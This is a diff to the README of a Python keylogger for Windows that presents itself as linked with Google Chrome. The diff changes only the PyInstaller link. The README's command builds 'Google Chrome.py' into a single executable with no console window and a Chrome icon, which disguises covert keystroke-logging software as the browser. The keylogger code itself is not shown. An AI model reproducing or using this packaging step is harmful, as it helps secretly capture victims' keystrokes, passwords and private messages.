@@ -1,6 +1,6 @@
 # A.K-Python-KeyLogger
 A.K Python KeyLogger is a python based keylogger and linked with Google Chrome for windows based operating system.
-Use pyinstaller to convert .py file with dependencies to single .exe file:-
+Use [pyinstaller](https://github.com/pyinstaller/pyinstaller/releases/download/v3.2.1/PyInstaller-3.2.1.zip) to convert .py file with dependencies to single .exe file:-
 ```bash
   pyinstaller --onefile --noconsole --ico=chrome.ico "Google Chrome.py"
 ```
